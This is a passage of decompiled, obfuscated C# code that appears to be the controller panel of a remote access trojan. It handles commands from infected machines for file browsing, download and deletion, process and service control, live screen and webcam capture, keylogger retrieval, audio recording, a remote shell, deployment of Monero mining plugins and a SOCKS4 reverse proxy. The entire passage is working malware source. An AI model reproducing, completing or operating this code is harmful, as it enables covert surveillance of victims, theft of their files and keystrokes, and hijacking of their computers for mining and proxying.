									string key = cclient2.SCREENLIVE_USER_KEY;
									bool flag5;
									try
									{
										flag5 = Class130.concurrentDictionary_3.ContainsKey(key);
										goto IL_4CE7;
									}
									catch (Exception ex32)
									{
									}
									flag5 = false;
									IL_4CE7:
									if (!flag5)
									{
										CClient cclient90 = cclient2;
										bool flag3 = false;
										cclient90.SOCKET_DISCONNECT(ref flag3);
									}
									else
									{
										if (array9[2].Length > 0)
										{
											cclient2.sPacket.Append(array9[2]);
										}
										CClient cclient91 = Class130.concurrentDictionary_3[cclient2.SCREENLIVE_USER_KEY];
										ptr2 = ref cclient91.stats_bytes_in;
										cclient91.stats_bytes_in = ptr2 + (double)num;
										Class130.concurrentDictionary_3[cclient2.SCREENLIVE_USER_KEY].SCREENLIVE_SOCKET_ID = cclient2.sKey;
									}
								}
								catch (Exception ex33)
								{
									CClient cclient92 = cclient2;
									bool flag3 = false;
									cclient92.SOCKET_DISCONNECT(ref flag3);
								}
								return;
							}
							if (Operators.CompareString(left, "SC_ST2", true) == 0)
							{
								try
								{
									cclient2.sock_async.socket_0.ReceiveBufferSize = Class135.smethod_0().TransfersRecvBytes;
									string[] array9 = Strings.Split(text14, "|", 3, CompareMethod.Text);
									cclient2.SCREENLIVE_SECONDARY_ACTIVE = true;
									cclient2.SCREENLIVE_SECONDARY_USER_KEY = array9[1];
									ref double ptr2 = ref Class130.struct20_0.double_2;
									Class130.struct20_0.double_2 = ptr2 + (double)num;
									ptr2 = ref Class130.struct20_0.double_4;
									Class130.struct20_0.double_4 = ptr2 + 1.0;
									string key = cclient2.SCREENLIVE_SECONDARY_USER_KEY;
									bool flag5;
									try
									{
										flag5 = Class130.concurrentDictionary_3.ContainsKey(key);
										goto IL_4E19;
									}
									catch (Exception ex34)
									{
									}
									flag5 = false;
									IL_4E19:
									if (!flag5)
									{
										CClient cclient93 = cclient2;
										bool flag3 = false;
										cclient93.SOCKET_DISCONNECT(ref flag3);
									}
									else
									{
										if (array9[2].Length > 0)
										{
											cclient2.sPacket.Append(array9[2]);
										}
										CClient cclient94 = Class130.concurrentDictionary_3[cclient2.SCREENLIVE_SECONDARY_USER_KEY];
										ptr2 = ref cclient94.stats_bytes_in;
										cclient94.stats_bytes_in = ptr2 + (double)num;
										Class130.concurrentDictionary_3[cclient2.SCREENLIVE_SECONDARY_USER_KEY].SCREENLIVE_SECONDARY_SOCKET_ID = cclient2.sKey;
									}
								}
								catch (Exception ex35)
								{
									CClient cclient95 = cclient2;
									bool flag3 = false;
									cclient95.SOCKET_DISCONNECT(ref flag3);
								}
								return;
							}
							if (Operators.CompareString(left, "SCK_CMD", true) == 0)
							{
								try
								{
									string[] array9 = Strings.Split(text14, "|", 3, CompareMethod.Text);
									cclient2.sock_async.socket_0.ReceiveBufferSize = Class135.smethod_0().TransfersRecvBytes;
									cclient2.SOCKET_COMMAND_ACTIVE = true;
									cclient2.SOCKET_COMMAND_USER_KEY = array9[1];
									ref double ptr2 = ref Class130.struct20_0.double_2;
									Class130.struct20_0.double_2 = ptr2 + (double)num;
									ptr2 = ref Class130.struct20_0.double_4;
									Class130.struct20_0.double_4 = ptr2 + 1.0;
									string key = cclient2.SOCKET_COMMAND_USER_KEY;
									bool flag5;
									try
									{
										flag5 = Class130.concurrentDictionary_3.ContainsKey(key);
										goto IL_4F4B;
									}
									catch (Exception ex36)
									{
									}
									flag5 = false;
									IL_4F4B:
									if (!flag5)
									{
										CClient cclient96 = cclient2;
										bool flag3 = false;
										cclient96.SOCKET_DISCONNECT(ref flag3);
									}
									else
									{
										CClient cclient97 = Class130.concurrentDictionary_3[cclient2.SOCKET_COMMAND_USER_KEY];
										ptr2 = ref cclient97.stats_bytes_in;
										cclient97.stats_bytes_in = ptr2 + (double)num;
										if (array9[2].Length > 0)
										{
											cclient2.mPacket.Write(Encoding.UTF8.GetBytes(array9[2]), 0, Encoding.UTF8.GetBytes(array9[2]).Length);
											if (Encoding.UTF8.GetString(cclient2.mPacket.ToArray()).EndsWith("@"))
											{
												CClient cclient98 = Class130.concurrentDictionary_3[cclient2.SOCKET_COMMAND_USER_KEY];
												string text15 = Encoding.UTF8.GetString(cclient2.mPacket.ToArray());
												ref string ptr3 = ref text15;
												CClient cclient7 = cclient98;
												CClient.Class152 @class = new CClient.Class152();
												@class.cclient_0 = cclient7;
												checked
												{
													if (ptr3.EndsWith("@"))
													{
														ptr3 = ptr3.Remove(ptr3.Length - 1);
													}
													string[] array = Strings.Split(ptr3, "|", 4, CompareMethod.Text);
													fMain ff7 = cclient7.ff;
													CClient cclient8 = cclient7;
													long num2 = Class136.smethod_36();
													string[] array10 = array;
													int num58 = 1;
													ref string ptr4 = ref array10[num58];
													long value = Conversions.ToLong(array10[num58]);
													ff7.method_19(ref cclient8, ref num2, ref value);
													ptr4 = Conversions.ToString(value);
													try
													{
														CClient.Class151 class2 = new CClient.Class151();
														class2.class152_0 = @class;
														class2.byte_0 = Convert.FromBase64String(array[3]);
														class2.class152_0.string_0 = Strings.Split(Encoding.UTF8.GetString(Convert.FromBase64String(array[3])), "|", -1, CompareMethod.Text);
														long num4 = Conversions.ToLong(array[2]);
														string left2 = Strings.LCase(array[0]);
														if (Operators.CompareString(left2, "cli_sleep", true) == 0)
														{
															if (Conversion.Val(class2.class152_0.string_0[0]) == 0.0)
															{
																cclient7.pending_dc = false;
																cclient7.pending_dc_timeout = false;
																cclient7.bJustConnected = false;
															}
														}
														else if (Operators.CompareString(left2, "cli_hib", true) == 0)
														{
															if (Conversion.Val(class2.class152_0.string_0[0]) == 0.0)
															{
																cclient7.pending_dc = false;
																cclient7.pending_dc_timeout = false;
																cclient7.bJustConnected = false;
															}
														}
														else if (Operators.CompareString(left2, "cli_log", true) == 0)
														{
															if (Conversion.Val(class2.class152_0.string_0[0]) == 0.0)
															{
																cclient7.pending_dc = false;
																cclient7.pending_dc_timeout = false;
																cclient7.bJustConnected = false;
															}
														}
														else if (Operators.CompareString(left2, "cli_rs", true) == 0)
														{
															if (Conversion.Val(class2.class152_0.string_0[0]) == 0.0)
															{
																cclient7.pending_dc = false;
																cclient7.pending_dc_timeout = false;
																cclient7.bJustConnected = false;
															}
														}
														else if (Operators.CompareString(left2, "cli_off", true) == 0)
														{
															if (Conversion.Val(class2.class152_0.string_0[0]) == 0.0)
															{
																cclient7.pending_dc = false;
																cclient7.pending_dc_timeout = false;
																cclient7.bJustConnected = false;
															}
														}
														else if (Operators.CompareString(left2, "con", true) == 0)
														{
															int num5 = class2.class152_0.string_0.Length;
															if (num5 != 15)
															{
																if (num5 == 16)
																{
																	fMain ff8 = cclient7.ff;
																	cclient8 = cclient7;
																	ff8.method_20(ref cclient8, ref class2.class152_0.string_0[0], ref class2.class152_0.string_0[1], ref class2.class152_0.string_0[2], ref class2.class152_0.string_0[3], ref class2.class152_0.string_0[4], ref class2.class152_0.string_0[5], ref class2.class152_0.string_0[6], ref class2.class152_0.string_0[7], ref class2.class152_0.string_0[8], ref class2.class152_0.string_0[9], ref class2.class152_0.string_0[10], ref class2.class152_0.string_0[11], ref class2.class152_0.string_0[12], ref class2.class152_0.string_0[13], ref class2.class152_0.string_0[14], ref class2.class152_0.string_0[15]);
																}
															}
															else
															{
																fMain ff9 = cclient7.ff;
																cclient8 = cclient7;
																string[] string_31 = class2.class152_0.string_0;
																int num59 = 0;
																string[] string_32 = class2.class152_0.string_0;
																int num60 = 1;
																string[] string_33 = class2.class152_0.string_0;
																int num61 = 2;
																string[] string_34 = class2.class152_0.string_0;
																int num62 = 3;
																string[] string_35 = class2.class152_0.string_0;
																int num63 = 4;
																string[] string_36 = class2.class152_0.string_0;
																int num64 = 5;
																string[] string_37 = class2.class152_0.string_0;
																int num65 = 6;
																string[] string_38 = class2.class152_0.string_0;
																int num66 = 7;
																string[] string_39 = class2.class152_0.string_0;
																int num67 = 8;
																string[] string_40 = class2.class152_0.string_0;
																int num68 = 9;
																string[] string_41 = class2.class152_0.string_0;
																int num69 = 10;
																string[] string_42 = class2.class152_0.string_0;
																int num70 = 11;
																string[] string_43 = class2.class152_0.string_0;
																int num71 = 12;
																string[] string_44 = class2.class152_0.string_0;
																int num72 = 13;
																string[] string_45 = class2.class152_0.string_0;
																int num73 = 14;
																string text = "Default";
																ff9.method_20(ref cclient8, ref string_31[num59], ref string_32[num60], ref string_33[num61], ref string_34[num62], ref string_35[num63], ref string_36[num64], ref string_37[num65], ref string_38[num66], ref string_39[num67], ref string_40[num68], ref string_41[num69], ref string_42[num70], ref string_43[num71], ref string_44[num72], ref string_45[num73], ref text);
															}
														}
														else if (Operators.CompareString(left2, "info", true) == 0)
														{
															if (cclient7.fDB == null)
															{
																CClient cclient99 = cclient7;
																bool flag = true;
																cclient99.SOCKET_DISCONNECT(ref flag);
																goto IL_7149;
															}
															new Thread(new ThreadStart(class2.class152_0._Lambda$__0)).Start();
														}
														else if (Operators.CompareString(left2, "drives_get", true) == 0)
														{
															if (cclient7.fDB == null)
															{
																CClient cclient100 = cclient7;
																bool flag = true;
																cclient100.SOCKET_DISCONNECT(ref flag);
																goto IL_7149;
															}
															new Thread(new ThreadStart(class2.class152_0._Lambda$__1)).Start();
														}
														else if (Operators.CompareString(left2, "files_get", true) == 0)
														{
															if (cclient7.fDB == null)
															{
																CClient cclient101 = cclient7;
																bool flag = true;
																cclient101.SOCKET_DISCONNECT(ref flag);
																goto IL_7149;
															}
															new Thread(new ThreadStart(class2.class152_0._Lambda$__2)).Start();
														}
														else if (Operators.CompareString(left2, "files_search", true) == 0)
														{
															if (cclient7.fDB == null)
															{
																CClient cclient102 = cclient7;
																bool flag = true;
																cclient102.SOCKET_DISCONNECT(ref flag);
																goto IL_7149;
															}
															cclient7.fSrch.method_3(class2.class152_0.string_0[0], class2.class152_0.string_0[1], class2.class152_0.string_0[2], class2.class152_0.string_0[3], class2.class152_0.string_0[4], class2.class152_0.string_0[5], string.Empty, string.Empty);
														}
														else if (Operators.CompareString(left2, "files_search_error_start", true) == 0)
														{
															if (cclient7.fDB == null)
															{
																CClient cclient103 = cclient7;
																bool flag = true;
																cclient103.SOCKET_DISCONNECT(ref flag);
																goto IL_7149;
															}
															cclient7.fSrch.method_2(class2.class152_0.string_0[0]);
														}
														else if (Operators.CompareString(left2, "files_search_error_file", true) == 0)
														{
															if (cclient7.fDB == null)
															{
																CClient cclient104 = cclient7;
																bool flag = true;
																cclient104.SOCKET_DISCONNECT(ref flag);
																goto IL_7149;
															}
															cclient7.fSrch.method_3(class2.class152_0.string_0[0], class2.class152_0.string_0[1], class2.class152_0.string_0[2], "N/A", class2.class152_0.string_0[3], "N/A", string.Empty, class2.class152_0.string_0[4]);
														}
														else if (Operators.CompareString(left2, "files_search_path", true) == 0)
														{
															if (cclient7.fDB == null)
															{
																CClient cclient105 = cclient7;
																bool flag = true;
																cclient105.SOCKET_DISCONNECT(ref flag);
																goto IL_7149;
															}
															cclient7.fSrch.method_8(class2.class152_0.string_0[0]);
															cclient7.fSrch.method_1(class2.class152_0.string_0[1]);
														}
														else if (Operators.CompareString(left2, "files_search_done", true) == 0)
														{
															if (cclient7.fDB == null)
															{
																CClient cclient106 = cclient7;
																bool flag = true;
																cclient106.SOCKET_DISCONNECT(ref flag);
																goto IL_7149;
															}
															cclient7.fSrch.method_5(true, class2.class152_0.string_0[0]);
														}
														else if (Operators.CompareString(left2, "files_zip_start", true) == 0)
														{
															if (cclient7.fDB == null)
															{
																CClient cclient107 = cclient7;
																bool flag = true;
																cclient107.SOCKET_DISCONNECT(ref flag);
																goto IL_7149;
															}
															new Thread(new ThreadStart(class2.class152_0._Lambda$__3)).Start();
														}
														else if (Operators.CompareString(left2, "files_zip", true) == 0)
														{
															if (cclient7.fDB == null)
															{
																CClient cclient108 = cclient7;
																bool flag = true;
																cclient108.SOCKET_DISCONNECT(ref flag);
																goto IL_7149;
															}
															new Thread(new ThreadStart(class2.class152_0._Lambda$__4)).Start();
														}
														else if (Operators.CompareString(left2, "files_zip_end", true) == 0)
														{
															if (cclient7.fDB == null)
															{
																CClient cclient109 = cclient7;
																bool flag = true;
																cclient109.SOCKET_DISCONNECT(ref flag);
																goto IL_7149;
															}
															new Thread(new ThreadStart(class2.class152_0._Lambda$__5)).Start();
														}
														else if (Operators.CompareString(left2, "files_delete_start", true) == 0)
														{
															if (cclient7.fDB == null)
															{
																CClient cclient110 = cclient7;
																bool flag = true;
																cclient110.SOCKET_DISCONNECT(ref flag);
																goto IL_7149;
															}
															fDashboard fDB11 = cclient7.fDB;
															value = (long)Math.Round(Conversion.Val(class2.class152_0.string_0[0]));
															string text = "0";
															fDB11.method_4(ref value, ref text);
														}
														else if (Operators.CompareString(left2, "files_delete", true) == 0)
														{
															if (cclient7.fDB == null)
															{
																CClient cclient111 = cclient7;
																bool flag = true;
																cclient111.SOCKET_DISCONNECT(ref flag);
																goto IL_7149;
															}
															fDashboard fDB12 = cclient7.fDB;
															value = (long)Math.Round(Conversion.Val(class2.class152_0.string_0[0]));
															fDB12.method_4(ref value, ref class2.class152_0.string_0[1]);
														}
														else if (Operators.CompareString(left2, "files_delete_end", true) == 0)
														{
															if (cclient7.fDB == null)
															{
																CClient cclient112 = cclient7;
																bool flag = true;
																cclient112.SOCKET_DISCONNECT(ref flag);
																goto IL_7149;
															}
															fDashboard fDB13 = cclient7.fDB;
															value = (long)Math.Round(Conversion.Val(class2.class152_0.string_0[0]));
															fDB13.method_4(ref value, ref class2.class152_0.string_0[1]);
														}
														else
														{
															if (Operators.CompareString(left2, "files_download", true) == 0)
															{
																if (cclient7.fDB == null)
																{
																	CClient cclient113 = cclient7;
																	bool flag = true;
																	cclient113.SOCKET_DISCONNECT(ref flag);
																	goto IL_7149;
																}
																string text16 = string.Concat(new string[]
																{
																	Application.StartupPath,
																	"\\Downloads\\",
																	Strings.Replace(cclient7.sUser, "\\", "^", 1, -1, CompareMethod.Text),
																	"\\",
																	Strings.Replace(class2.class152_0.string_0[0], ":", string.Empty, 1, -1, CompareMethod.Text)
																});
																byte[] array11 = Convert.FromBase64String(class2.class152_0.string_0[1]);
																bool flag2 = true;
																byte[] byte_ = array11;
																string string_16 = text16;
																Class136.Class142 class3 = new Class136.Class142();
																class3.string_0 = string_16;
																class3.byte_0 = byte_;
																class3.bool_0 = false;
																try
																{
																	if (flag2)
																	{
																		new Thread(new ThreadStart(class3._Lambda$__0)).Start();
																	}
																	else
																	{
																		Class136.smethod_15(ref class3.string_0, ref class3.byte_0, class3.bool_0);
																	}
																	goto IL_70F8;
																}
																catch (Exception ex37)
																{
																	goto IL_70F8;
																}
															}
															if (Operators.CompareString(left2, "prc_list", true) == 0)
															{
																if (cclient7.fDB == null)
																{
																	CClient cclient114 = cclient7;
																	bool flag = true;
																	cclient114.SOCKET_DISCONNECT(ref flag);
																	goto IL_7149;
																}
																new Thread(new ThreadStart(class2.class152_0._Lambda$__6)).Start();
															}
															else if (Operators.CompareString(left2, "prc_kill", true) == 0)
															{
																if (cclient7.fDB == null)
																{
																	CClient cclient115 = cclient7;
																	bool flag = true;
																	cclient115.SOCKET_DISCONNECT(ref flag);
																	goto IL_7149;
																}
																if (Operators.CompareString(class2.class152_0.string_0[0], "1", true) == 0)
																{
																	new Thread(new ThreadStart(class2.class152_0._Lambda$__7)).Start();
																}
															}
															else if (Operators.CompareString(left2, "srv_list", true) == 0)
															{
																if (cclient7.fDB == null)
																{
																	CClient cclient116 = cclient7;
																	bool flag = true;
																	cclient116.SOCKET_DISCONNECT(ref flag);
																	goto IL_7149;
																}
																new Thread(new ThreadStart(class2.class152_0._Lambda$__8)).Start();
															}
															else if (Operators.CompareString(left2, "srv_start", true) == 0)
															{
																if (cclient7.fDB == null)
																{
																	CClient cclient117 = cclient7;
																	bool flag = true;
																	cclient117.SOCKET_DISCONNECT(ref flag);
																	goto IL_7149;
																}
																if (Operators.CompareString(class2.class152_0.string_0[0], "1", true) == 0)
																{
																	new Thread(new ThreadStart(class2.class152_0._Lambda$__9)).Start();
																}
															}
															else if (Operators.CompareString(left2, "srv_control", true) == 0)
															{
																if (cclient7.fDB == null)
																{
																	CClient cclient118 = cclient7;
																	bool flag = true;
																	cclient118.SOCKET_DISCONNECT(ref flag);
																	goto IL_7149;
																}
																if (Operators.CompareString(class2.class152_0.string_0[0], "1", true) == 0)
																{
																	new Thread(new ThreadStart(class2.class152_0._Lambda$__10)).Start();
																}
															}
															else if (Operators.CompareString(left2, "srv_uninstall", true) == 0)
															{
																if (cclient7.fDB == null)
																{
																	CClient cclient119 = cclient7;
																	bool flag = true;
																	cclient119.SOCKET_DISCONNECT(ref flag);
																	goto IL_7149;
																}
																if (Operators.CompareString(class2.class152_0.string_0[0], "1", true) == 0)
																{
																	new Thread(new ThreadStart(class2.class152_0._Lambda$__11)).Start();
																}
															}
															else if (Operators.CompareString(left2, "wnd_list", true) == 0)
															{
																if (cclient7.fDB == null)
																{
																	CClient cclient120 = cclient7;
																	bool flag = true;
																	cclient120.SOCKET_DISCONNECT(ref flag);
																	goto IL_7149;
																}
																new Thread(new ThreadStart(class2.class152_0._Lambda$__12)).Start();
															}
															else if (Operators.CompareString(left2, "wnd_cmd", true) == 0)
															{
																if (cclient7.fDB == null)
																{
																	CClient cclient121 = cclient7;
																	bool flag = true;
																	cclient121.SOCKET_DISCONNECT(ref flag);
																	goto IL_7149;
																}
																if (Operators.CompareString(class2.class152_0.string_0[0], "1", true) == 0)
																{
																	new Thread(new ThreadStart(class2.class152_0._Lambda$__13)).Start();
																}
															}
															else if (Operators.CompareString(left2, "wnd_title", true) == 0)
															{
																if (cclient7.fDB == null)
																{
																	CClient cclient122 = cclient7;
																	bool flag = true;
																	cclient122.SOCKET_DISCONNECT(ref flag);
																	goto IL_7149;
																}
																if (Operators.CompareString(class2.class152_0.string_0[0], "1", true) == 0)
																{
																	new Thread(new ThreadStart(class2.class152_0._Lambda$__14)).Start();
																}
															}
															else if (Operators.CompareString(left2, "screenlive", true) == 0)
															{
																if (cclient7.fDB == null)
																{
																	CClient cclient123 = cclient7;
																	bool flag = true;
																	cclient123.SOCKET_DISCONNECT(ref flag);
																	goto IL_7149;
																}
																if (num4 - 1L == unchecked((long)array[3].Length))
																{
																	MemoryStream stream = new MemoryStream(class2.byte_0);
																	cclient7.fDB.vmethod_24().Image = Image.FromStream(stream);
																	cclient7.SCREEN_FPS_UPDATE((double)(Strings.Len(array[0]) + Strings.Len(array[1]) + Strings.Len(array[2]) + Strings.Len(array[3]) + 4));
																}
															}
															else if (Operators.CompareString(left2, "screenlive_secondary", true) == 0)
															{
																if (cclient7.fDB == null)
																{
																	CClient cclient124 = cclient7;
																	bool flag = true;
																	cclient124.SOCKET_DISCONNECT(ref flag);
																	goto IL_7149;
																}
																if (num4 - 1L == unchecked((long)array[3].Length))
																{
																	MemoryStream stream2 = new MemoryStream(class2.byte_0);
																	cclient7.fDB.vmethod_248().Image = Image.FromStream(stream2);
																}
															}
															else if (Operators.CompareString(left2, "screenlive_stop", true) == 0)
															{
																if (cclient7.fDB == null)
																{
																	CClient cclient125 = cclient7;
																	bool flag = true;
																	cclient125.SOCKET_DISCONNECT(ref flag);
																	goto IL_7149;
																}
																cclient7.fDB.method_6();
															}
															else if (Operators.CompareString(left2, "screen_preview_stop", true) != 0)
															{
																if (Operators.CompareString(left2, "monitors_refresh", true) == 0)
																{
																	if (cclient7.fDB == null)
																	{
																		CClient cclient126 = cclient7;
																		bool flag = true;
																		cclient126.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	cclient7.fDB.method_7(ref class2.class152_0.string_0[0]);
																}
																else if (Operators.CompareString(left2, "webcamlive", true) == 0)
																{
																	if (cclient7.fDB == null)
																	{
																		CClient cclient127 = cclient7;
																		bool flag = true;
																		cclient127.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	if (num4 - 1L == unchecked((long)array[3].Length))
																	{
																		MemoryStream stream3 = new MemoryStream(class2.byte_0);
																		cclient7.fDB.vmethod_264().Image = Image.FromStream(stream3);
																		CClient cclient128 = cclient7;
																		double num21 = (double)(Strings.Len(array[0]) + Strings.Len(array[1]) + Strings.Len(array[2]) + Strings.Len(array[3]) + 4);
																		cclient128.WEBCAM_FPS_UPDATE(ref num21);
																	}
																}
																else if (Operators.CompareString(left2, "webcam_start", true) == 0)
																{
																	bool flag;
																	if (cclient7.fDB == null)
																	{
																		CClient cclient129 = cclient7;
																		flag = true;
																		cclient129.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	fDashboard fDB14 = cclient7.fDB;
																	flag = true;
																	fDB14.method_9(ref flag);
																}
																else if (Operators.CompareString(left2, "webcam_stop", true) == 0)
																{
																	bool flag;
																	if (cclient7.fDB == null)
																	{
																		CClient cclient130 = cclient7;
																		flag = true;
																		cclient130.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	fDashboard fDB15 = cclient7.fDB;
																	flag = false;
																	fDB15.method_9(ref flag);
																}
																else if (Operators.CompareString(left2, "webcam_devices", true) == 0)
																{
																	if (cclient7.fDB == null)
																	{
																		CClient cclient131 = cclient7;
																		bool flag = true;
																		cclient131.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	cclient7.fDB.method_8(ref class2.class152_0.string_0[0]);
																}
																else if (Operators.CompareString(left2, "klgoff_list", true) == 0)
																{
																	if (cclient7.fDB == null)
																	{
																		CClient cclient132 = cclient7;
																		bool flag = true;
																		cclient132.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	cclient7.fDB.method_87(ref class2.class152_0.string_0[0]);
																}
																else if (Operators.CompareString(left2, "klgoff_get", true) == 0)
																{
																	if (cclient7.fDB == null)
																	{
																		CClient cclient133 = cclient7;
																		bool flag = true;
																		cclient133.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	cclient7.fDB.method_88(ref class2.class152_0.string_0[0]);
																}
																else if (Operators.CompareString(left2, "klgoff_del", true) == 0)
																{
																	if (cclient7.fDB == null)
																	{
																		CClient cclient134 = cclient7;
																		bool flag = true;
																		cclient134.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	cclient7.fDB.method_95(ref class2.class152_0.string_0[0]);
																}
																else if (Operators.CompareString(left2, "klgonlinestart", true) == 0)
																{
																	bool flag;
																	if (cclient7.fDB == null)
																	{
																		CClient cclient135 = cclient7;
																		flag = true;
																		cclient135.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	fDashboard fDB16 = cclient7.fDB;
																	flag = true;
																	fDB16.method_101(ref flag);
																}
																else if (Operators.CompareString(left2, "klgonlinestop", true) == 0)
																{
																	bool flag;
																	if (cclient7.fDB == null)
																	{
																		CClient cclient136 = cclient7;
																		flag = true;
																		cclient136.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	fDashboard fDB17 = cclient7.fDB;
																	flag = false;
																	fDB17.method_101(ref flag);
																}
																else if (Operators.CompareString(left2, "klgonlinedata", true) == 0)
																{
																	if (cclient7.fDB == null)
																	{
																		CClient cclient137 = cclient7;
																		bool flag = true;
																		cclient137.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	cclient7.fDB.method_100(ref class2.class152_0.string_0[0]);
																}
																else if (Operators.CompareString(left2, "aud_rec", true) == 0)
																{
																	if (cclient7.fDB == null)
																	{
																		CClient cclient138 = cclient7;
																		bool flag = true;
																		cclient138.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	new Thread(new ThreadStart(class2._Lambda$__15)).Start();
																}
																else if (Operators.CompareString(left2, "aud_rec_list", true) == 0)
																{
																	if (cclient7.fDB == null)
																	{
																		CClient cclient139 = cclient7;
																		bool flag = true;
																		cclient139.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	fDashboard fDB18 = cclient7.fDB;
																	string text = Encoding.UTF8.GetString(Convert.FromBase64String(class2.class152_0.string_0[0]));
																	fDB18.method_96(ref text);
																}
																else if (Operators.CompareString(left2, "shell_start", true) == 0)
																{
																	bool flag;
																	if (cclient7.fDB == null)
																	{
																		CClient cclient140 = cclient7;
																		flag = true;
																		cclient140.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	fDashboard fDB19 = cclient7.fDB;
																	flag = true;
																	fDB19.method_120(ref flag);
																}
																else if (Operators.CompareString(left2, "shell_stop", true) == 0)
																{
																	bool flag;
																	if (cclient7.fDB == null)
																	{
																		CClient cclient141 = cclient7;
																		flag = true;
																		cclient141.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	fDashboard fDB20 = cclient7.fDB;
																	flag = false;
																	fDB20.method_120(ref flag);
																}
																else if (Operators.CompareString(left2, "shell_exec", true) == 0)
																{
																	if (cclient7.fDB == null)
																	{
																		CClient cclient142 = cclient7;
																		bool flag = true;
																		cclient142.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	cclient7.fDB.method_121(ref class2.class152_0.string_0[0]);
																}
																else if (Operators.CompareString(left2, "con_list", true) == 0)
																{
																	if (cclient7.fDB == null)
																	{
																		CClient cclient143 = cclient7;
																		bool flag = true;
																		cclient143.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	new Thread(new ThreadStart(class2.class152_0._Lambda$__16)).Start();
																}
																else if (Operators.CompareString(left2, "xmr_mine_start", true) == 0)
																{
																	Class130.fMinerXMR_0.method_0(cclient7.sKey, cclient7.sUser);
																}
																else if (Operators.CompareString(left2, "xmr_mine_stop", true) == 0)
																{
																	Class130.fMinerXMR_0.method_2(cclient7.sKey);
																}
																else
																{
																	if (Operators.CompareString(left2, "xmr_mine_req", true) == 0)
																	{
																		if (Operators.CompareString(class2.class152_0.string_0[0], "0", true) != 0)
																		{
																			goto IL_70F8;
																		}
																		string sKey8 = cclient7.sKey;
																		string str21 = "xmr_mine_data|";
																		string text = Application.StartupPath + "\\data\\plugins\\xmr.plg";
																		string str22 = Class136.smethod_29(ref text);
																		string str23 = "|";
																		text = Application.StartupPath + "\\data\\plugins\\xmr.plg";
																		string string_17 = str21 + str22 + str23 + Class136.smethod_13(ref text);
																		string string_18 = sKey8;
																		Class136.Class138 class4 = new Class136.Class138();
																		class4.string_0 = string_18;
																		class4.string_1 = string_17;
																		class4.long_0 = 0L;
																		try
																		{
																			if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
																			{
																				new Thread(new ThreadStart(class4._Lambda$__0)).Start();
																			}
																			goto IL_70F8;
																		}
																		catch (Exception ex38)
																		{
																			goto IL_70F8;
																		}
																	}
																	if (Operators.CompareString(left2, "xmr_mine_ready", true) == 0)
																	{
																		string sKey9 = cclient7.sKey;
																		string string_17 = "xmr_mine_start|" + cclient7.MINER_LAST_SETTINGS;
																		string string_18 = sKey9;
																		Class136.Class138 class4 = new Class136.Class138();
																		class4.string_0 = string_18;
																		class4.string_1 = string_17;
																		class4.long_0 = 0L;
																		try
																		{
																			if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
																			{
																				new Thread(new ThreadStart(class4._Lambda$__0)).Start();
																			}
																			goto IL_70F8;
																		}
																		catch (Exception ex39)
																		{
																			goto IL_70F8;
																		}
																	}
																	if (Operators.CompareString(left2, "xmr64_mine_req", true) == 0)
																	{
																		if (Operators.CompareString(class2.class152_0.string_0[0], "0", true) != 0)
																		{
																			goto IL_70F8;
																		}
																		string sKey10 = cclient7.sKey;
																		string str24 = "xmr64_mine_data|";
																		string text = Application.StartupPath + "\\data\\plugins\\xmr64.plg";
																		string str25 = Class136.smethod_29(ref text);
																		string str26 = "|";
																		text = Application.StartupPath + "\\data\\plugins\\xmr64.plg";
																		string string_17 = str24 + str25 + str26 + Class136.smethod_13(ref text);
																		string string_18 = sKey10;
																		Class136.Class138 class4 = new Class136.Class138();
																		class4.string_0 = string_18;
																		class4.string_1 = string_17;
																		class4.long_0 = 0L;
																		try
																		{
																			if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
																			{
																				new Thread(new ThreadStart(class4._Lambda$__0)).Start();
																			}
																			goto IL_70F8;
																		}
																		catch (Exception ex40)
																		{
																			goto IL_70F8;
																		}
																	}
																	if (Operators.CompareString(left2, "xmr64_mine_ready", true) == 0)
																	{
																		string sKey11 = cclient7.sKey;
																		string string_17 = "xmr64_mine_start|" + cclient7.MINER_LAST_SETTINGS;
																		string string_18 = sKey11;
																		Class136.Class138 class4 = new Class136.Class138();
																		class4.string_0 = string_18;
																		class4.string_1 = string_17;
																		class4.long_0 = 0L;
																		try
																		{
																			if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
																			{
																				new Thread(new ThreadStart(class4._Lambda$__0)).Start();
																			}
																			goto IL_70F8;
																		}
																		catch (Exception ex41)
																		{
																			goto IL_70F8;
																		}
																	}
																	if (Operators.CompareString(left2, "xmr_mine_stats", true) == 0)
																	{
																		if (Class130.fMinerXMR_0.Visible)
																		{
																			Class130.fMinerXMR_0.method_1(cclient7.sKey, class2.class152_0.string_0);
																		}
																	}
																	else if (Operators.CompareString(left2, "xmr_mine_log", true) == 0)
																	{
																		Class130.fMinerXMRLogManager_0.method_0(cclient7.sKey, cclient7.sIP + "^" + cclient7.sUser, class2.class152_0.string_0[0]);
																	}
																	else if (Operators.CompareString(left2, "socks4r_start", true) == 0)
																	{
																		Class130.fSocks4R_0.method_0(cclient7.sKey, cclient7.sUser, class2.class152_0.string_0[0], class2.class152_0.string_0[1]);
																	}
																	else if (Operators.CompareString(left2, "socks4r_stop", true) == 0)
																	{
																		Class130.fSocks4R_0.method_1(cclient7.sKey);
																	}
																	else if (Operators.CompareString(left2, "socks4r_stats", true) == 0)
																	{
																		Class130.fSocks4R_0.method_2(cclient7.sKey, class2.class152_0.string_0);
																	}
